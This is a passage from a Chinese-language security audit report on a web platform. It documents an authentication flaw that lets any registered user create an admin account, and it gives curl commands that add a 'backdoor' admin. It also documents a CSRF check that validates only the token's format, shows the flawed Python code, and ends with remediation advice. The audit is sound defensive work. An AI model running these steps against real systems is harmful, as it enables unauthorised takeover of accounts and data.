### 向量2: 认证绕过 → 管理员提权

- **入口点**: `POST /api/auth/register` → `POST /api/admin/users`
- **利用方式**:
  1. 注册普通用户账号
  2. 发现 `admin.py` 的 `admin_create_user` 端点未使用 `require_role("admin")` 依赖注入
  3. 直接调用 `POST /api/admin/users` 创建 admin 角色用户
  4. 使用新 admin 账号访问所有管理功能
- **预期影响**: 完全控制平台，访问所有用户数据

**攻击步骤**:
```bash

  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attacker1!"}'

# Step 2: 登录获取 token
curl -X POST http://target/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attacker1!"}'

# Step 3: 创建 admin 用户（无需 admin 权限！）
curl -X POST http://target/api/admin/users \
  -H "Authorization: Bearer <attacker_token>" \
  -H "Content-Type: application/json" \
  -d '{"username":"backdoor","password":"Backdoor1!","role":"admin"}'
```

### 向量5: CSRF 攻击

- **入口点**: 所有 POST/PUT/DELETE 端点
- **利用方式**: CSRF Token 机制仅验证 Header 格式（32+ hex 字符），未与服务端 session 绑定。攻击者可自行生成合法格式的 CSRF Token
- **预期影响**: 以已登录用户身份执行任意操作

**根因分析**:
```python
# auth.py 中的 CSRF 验证缺陷
def _validate_csrf_token(request: Request) -> bool:
    csrf_header = request.headers.get("X-CSRF-Token", "")
    if not csrf_header:
        return False
    # 仅检查格式！没有与服务端存储的 token 比对
    if len(csrf_header) < 32 or not all(c in "0123456789abcdefABCDEF" for c in csrf_header):
        return False
    # ... Origin/Referer 检查（可被绕过）
    return True
```

## 综合风险评估

**整体风险等级**: 🔴 **高危**

**关键发现**:
- **认证/授权体系存在系统性缺陷**: 管理端点缺少权限检查，普通用户可提权为管理员
- **输入验证不一致**: 部分端点有完善的 XSS/注入防护，部分端点（clipboard、ingest）完全缺失
- **CSRF 防护形同虚设**: 仅验证格式不验证内容，可被绕过
- **文件操作安全性不足**: 模糊匹配逻辑贯穿 view/delete/download 路径

**攻击面总结**:
- 20 个已识别漏洞，其中 7 个 P0 级
- 最严重攻击链：注册 → 提权 → 完全控制（3步完成）
- 最隐蔽攻击：存储型 XSS → 窃取所有用户 Token

**建议立即行动**:
1. 修复所有 P0 级漏洞（预计 2-4 小时）
2. 审计所有 `/api/admin/*` 端点的权限配置
3. 统一输入验证层，所有用户输入经过 `sanitize_xss` + `sanitize_user_input`
4. 部署 WAF 规则拦截常见攻击模式
